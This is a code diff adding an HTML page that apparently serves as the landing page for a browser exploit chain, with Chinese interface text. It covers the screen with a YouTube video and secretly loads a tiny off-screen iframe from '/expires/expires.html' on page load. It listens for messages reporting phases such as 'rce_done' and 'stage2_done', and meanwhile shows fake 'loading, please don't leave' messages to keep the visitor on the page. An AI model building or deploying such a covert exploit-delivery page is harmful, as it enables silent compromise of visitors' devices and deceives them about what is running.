@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>Chain</title>
+<script>
+(function () {
+  var q = new URLSearchParams(location.search);
+  var idle = q.get("idle") === "1" || q.get("done") === "1";
+  // Default: NO meta refresh. Mid-chain meta + same-origin WC exit/crash → Safari
+  // 「页面重复出现错误」. Use ?auto_ms=180000 only if you really want a safety net.
+  var AUTO_MS = Number(q.get("auto_ms") || 0);
+  window.__CESHI18_IDLE = idle;
+  window.__CESHI18_AUTO_REFRESH_SEC = idle ? 0 : (AUTO_MS > 0 ? Math.max(30, Math.round(AUTO_MS / 1000)) : 0);
+  if (!idle && AUTO_MS > 0) {
+    var sec = window.__CESHI18_AUTO_REFRESH_SEC;
+    document.write(
+      '<meta http-equiv="refresh" content="' +
+        sec +
+        ";url=" +
+        (location.origin || "") +
+        '/landing_observe.html?idle=1&via=meta">'
+    );
+  }
+})();
+</script>
+<style>
+  :root {
+    --ink: #1a2332;
+    --accent: #c45c26;
+    --accent2: #2a6f8f;
+    --bad: #a33b2b;
+    --muted: #5c6b7a;
+    --float-total: 60s;
+  }
+  * { box-sizing: border-box; }
+  html, body {
+    margin: 0;
+    min-height: 100%;
+    background: #0b1210;
+    color: var(--ink);
+    font-family: system-ui, -apple-system, "PingFang SC", sans-serif;
+  }
+  .yt {
+    position: fixed;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    background: #000;
+  }
+  .yt iframe {
+    position: absolute;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    border: 0;
+  }
+
+  .float-load {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 9999;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    background: rgba(80, 80, 80, 0.48);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    pointer-events: none;
+  }
+  body.chain-float .float-load { display: flex; }
+  body.chain-float-over .float-load { pointer-events: auto; }
+
+  .float-load-panel {
+    width: min(300px, 88vw);
+    padding: 26px 20px 20px;
+    border-radius: 14px;
+    background: rgba(255, 255, 255, 0.92);
+    border: 1px solid rgba(0, 0, 0, 0.06);
+    box-shadow: 0 12px 36px rgba(0, 0, 0, 0.18);
+    text-align: center;
+    position: relative;
+  }
+  .spinner {
+    width: 40px;
+    height: 40px;
+    margin: 0 auto 14px;
+    border-radius: 50%;
+    background: conic-gradient(from 0deg, #6b7280 0deg, #9ca3af 120deg, transparent 280deg);
+    -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 3.5px), #000 0);
+            mask: radial-gradient(farthest-side, transparent calc(100% - 3.5px), #000 0);
+    will-change: transform;
+  }
+  body.chain-float .spinner { animation: spin 0.85s linear infinite; }
+  body.chain-float-over .spinner { animation: none; opacity: 0.35; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Single text slot — never stack multiple phase nodes */
+  .float-copy {
+    position: relative;
+    min-height: 3.2em;
+    margin: 0;
+  }
+  .float-copy strong {
+    display: block;
+    font-size: 1.05rem;
+    font-weight: 600;
+    margin: 0 0 4px;
+    color: #374151;
+  }
+  .float-copy span {
+    display: block;
+    font-size: 0.84rem;
+    color: #6b7280;
+    line-height: 1.4;
+  }
+  body.chain-float-over .float-copy strong { color: #b45309; }
+
+  .float-load-bar {
+    height: 3px;
+    margin-top: 16px;
+    border-radius: 3px;
+    overflow: hidden;
+    background: rgba(0, 0, 0, 0.08);
+  }
+  .float-load-bar > i {
+    display: block;
+    height: 100%;
+    width: 100%;
+    border-radius: 3px;
+    background: linear-gradient(90deg, #9ca3af, #6b7280);
+    transform-origin: left center;
+    transform: scaleX(0.03);
+    will-change: transform;
+  }
+  body.chain-float:not(.chain-float-over) .float-load-bar > i {
+    animation: float-prog var(--float-total, 60s) linear forwards;
+  }
+  @keyframes float-prog {
+    from { transform: scaleX(0.03); }
+    to   { transform: scaleX(1); }
+  }
+
+  .float-actions {
+    display: none;
+    margin-top: 14px;
+  }
+  body.chain-float-over .float-actions { display: block; }
+  .float-actions a {
+    display: inline-block;
+    padding: 10px 18px;
+    background: #4b5563;
+    color: #f9fafb;
+    text-decoration: none;
+    font-size: 0.92rem;
+    border-radius: 8px;
+  }
+</style>
+</head>
+<body>
+  <div class="yt">
+    <iframe
+      id="yt"
+      src="https://www.youtube-nocookie.com/embed/aqz-KE-bpKQ?autoplay=1&amp;mute=1&amp;playsinline=1&amp;loop=1&amp;playlist=aqz-KE-bpKQ&amp;controls=1&amp;rel=0&amp;modestbranding=1"
+      title="video"
+      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+      allowfullscreen
+      referrerpolicy="strict-origin-when-cross-origin"
+    ></iframe>
+  </div>
+
+  <div class="float-load" id="floatLoad" aria-live="polite" aria-hidden="true">
+    <div class="float-load-panel">
+      <div class="spinner" aria-hidden="true"></div>
+      <div class="float-copy" id="floatCopy">
+        <strong id="floatTitle">正在加载中</strong>
+        <span id="floatText">请稍候，马上就好…</span>
+      </div>
+      <div class="float-actions" id="floatActions">
+        <a id="floatRefreshBtn" href="/landing_observe.html">刷新页面</a>
+      </div>
+      <div class="float-load-bar" aria-hidden="true"><i id="floatProg"></i></div>
+    </div>
+  </div>
+
+<script>
+(function () {
+  var q = new URLSearchParams(location.search);
+  var idle = !!window.__CESHI18_IDLE;
+  var floatTimer = null;
+  var phaseTimers = [];
+
+  var FLOAT_LOAD = window.__CESHI18_FLOAT_LOAD || {
+    totalSec: 60,
+    phases: [
+      { sec: 0,  title: "正在加载中", text: "请稍候，马上就好…" },
+      { sec: 10, title: "同步中",     text: "正在同步内容，请稍等…" },
+      { sec: 25, title: "加载中",     text: "还在处理，请不要离开…" },
+      { sec: 42, title: "马上完成",   text: "即将完成，请再等一下…" }
+    ],
+    overtime: {
+      title: "加载较慢",
+      text: "等待时间较长，可点击下方按钮刷新重试",
+      btn: "刷新页面",
+      href: "/landing_observe.html"
+    }
+  };
+  if (q.get("float_sec")) {
+    var fs = Number(q.get("float_sec"));
+    if (fs > 5 && fs < 600) FLOAT_LOAD.totalSec = fs;
+  }
+  window.__CESHI18_FLOAT_LOAD = FLOAT_LOAD;
+
+  function clearPhaseTimers() {
+    for (var i = 0; i < phaseTimers.length; i++) clearTimeout(phaseTimers[i]);
+    phaseTimers = [];
+  }
+
+  function setCopy(title, text) {
+    var t = document.getElementById("floatTitle");
+    var s = document.getElementById("floatText");
+    if (t) t.textContent = title || "";
+    if (s) s.textContent = text || "";
+  }
+
+  function showPhase(idx) {
+    var phases = FLOAT_LOAD.phases || [];
+    var p = phases[idx] || {};
+    setCopy(p.title || ("阶段 " + (idx + 1)), p.text || "");
+  }
+
+  function showOvertime() {
+    var ot = FLOAT_LOAD.overtime || {};
+    var total = Math.max(10, Number(FLOAT_LOAD.totalSec) || 60);
+    setCopy(
+      ot.title || "加载超时",
+      ot.text || ("已超过 " + total + " 秒仍未完成，请点击刷新重试")
+    );
+    var btn = document.getElementById("floatRefreshBtn");
+    if (btn) {
+      btn.textContent = ot.btn || "刷新页面";
+      btn.setAttribute("href", ot.href || "/landing_observe.html");
+    }
+  }
+
+  function armPhases() {
+    clearPhaseTimers();
+    var phases = FLOAT_LOAD.phases || [];
+    var total = Math.max(10, Number(FLOAT_LOAD.totalSec) || 60);
+    document.documentElement.style.setProperty("--float-total", total + "s");
+    if (!phases.length) {
+      setCopy("加载中", "请稍候…");
+      return;
+    }
+    showPhase(0);
+    for (var i = 1; i < phases.length; i++) {
+      (function (idx) {
+        var sec = Math.max(0, Number(phases[idx].sec) || 0);
+        phaseTimers.push(
+          setTimeout(function () {
+            if (!document.body.classList.contains("chain-float")) return;
+            if (document.body.classList.contains("chain-float-over")) return;
+            showPhase(idx);
+          }, sec * 1000)
+        );
+      })(i);
+    }
+  }
+
+  function setFloat(on) {
+    document.body.classList.toggle("chain-float", !!on);
+    document.body.classList.remove("chain-float-over");
+    var fl = document.getElementById("floatLoad");
+    if (fl) fl.setAttribute("aria-hidden", on ? "false" : "true");
+    if (floatTimer) {
+      clearTimeout(floatTimer);
+      floatTimer = null;
+    }
+    clearPhaseTimers();
+    if (!on) return;
+    armPhases();
+    var bar = document.getElementById("floatProg");
+    if (bar) {
+      bar.style.animation = "none";
+      void bar.offsetWidth;
+      bar.style.animation = "";
+    }
+    var totalMs = Math.max(10, Number(FLOAT_LOAD.totalSec) || 60) * 1000;
+    floatTimer = setTimeout(function () {
+      document.body.classList.add("chain-float-over");
+      showOvertime();
+    }, totalMs);
+  }
+
+  window.__ceshi18SetFloat = setFloat;
+
+  if (q.get("demo_float") === "1") setFloat(true);
+
+  window.addEventListener("message", function (ev) {
+    var d = ev && ev.data;
+    if (!d || d.source !== "ceshi18-chain") return;
+    if (d.type === "chain_busy" || d.type === "chain_start") {
+      var phase = d.phase || d.reason || "";
+      if (phase === "rce_done" || phase === "stage2_done" || d.type === "chain_start") {
+        setFloat(true);
+      }
+      return;
+    }
+    if (d.type === "chain_done") {
+      setFloat(false);
+      try {
+        location.replace((location.origin || "") + "/landing_observe.html?idle=1&via=chain_done");
+      } catch (_) {}
+    }
+  });
+
+  if (idle) return;
+
+  var ID = "ceshi18-chain-frame";
+  var FALLBACK_MS = 90000;
+  var done = false;
+  var iframe = document.createElement("iframe");
+  iframe.id = ID;
+  iframe.src = "/expires/expires.html";
+  iframe.setAttribute("style", "position:fixed;top:-300px;left:-300px;width:10px;height:10px;border:0");
+  document.body.appendChild(iframe);
+
+  function unload() {
+    if (done) return;
+    done = true;
+    var el = document.getElementById(ID);
+    if (el) {
+      try { el.src = "about:blank"; } catch (e) {}
+      try { el.remove(); } catch (e2) {}
+    }
+    setFloat(false);
+    try {
+      location.replace((location.origin || "") + "/landing_observe.html?idle=1&via=parent_fallback");
+    } catch (_) {}
+  }
+
+  setTimeout(unload, FALLBACK_MS);
+})();
+</script>
+</body>
+</html>
